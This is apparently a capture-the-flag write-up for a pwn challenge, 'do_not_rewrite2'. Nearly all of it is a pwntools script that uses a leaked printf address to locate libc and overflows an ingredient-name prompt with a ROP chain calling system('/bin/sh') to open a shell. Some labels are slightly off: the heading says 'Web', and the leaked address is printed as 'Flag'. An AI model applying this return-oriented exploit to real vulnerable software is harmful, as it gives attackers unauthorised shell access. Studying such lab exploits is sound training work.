# Web - do_not_rewrite2
Solved by **CapangJabba**

## Question
show_flag() has disappeared :<\
Let's try ROP
## Solution
```
from pwn import *
from ctypes import *
if args.REMOTE:
    io = remote(sys.argv[1],sys.argv[2])
else:
    io = process("./chall_patched", )
elf = context.binary = ELF("./chall_patched", checksec=False)
rop = ROP(elf)
libc = ELF('./libc.so.6')
context.log_level = 'debug'


io.recvuntil(b'hint: printf = ')
printf = int(io.recvline().strip(), 16)
print(f'Flag: {hex(printf)}')

io.recvuntil(b'Enter the name of ingredient 1: ')
io.sendline(b'a')
io.recvuntil(b'Enter the calories per gram for a: ')
io.sendline(b'1.2')
io.recvuntil(b'Enter the amount in grams for a: ')
io.sendline(b'1.3')

io.recvuntil(b'Enter the name of ingredient 2: ')
io.sendline(b'a')
io.recvuntil(b'Enter the calories per gram for a: ')
io.sendline(b'1.4')
io.recvuntil(b'Enter the amount in grams for a: ')
io.sendline(b'2.0')

io.recvuntil(b'Enter the name of ingredient 3: ')
io.sendline(b'a')
io.recvuntil(b'Enter the calories per gram for a: ')
io.sendline(b'3.1')
io.recvuntil(b'Enter the amount in grams for a: ')
io.sendline(b'2.3')

io.recvuntil(b'Enter the name of ingredient 4: ')




libc.address =  printf - libc.sym['printf']

ret = libc.address + 0x2882f

info("libc_base: %#x", libc.address)

rop = ROP(libc)

rop.system(next(libc.search(b'/bin/sh\x00')))

payload = flat([
    ret,
    rop.chain()
])

io.sendline(payload)
io.sendline(b'aaaa')

io.interactive()
```

### Flag
`FLAG{r0p_br0d3n_0ur_w0r1d}`
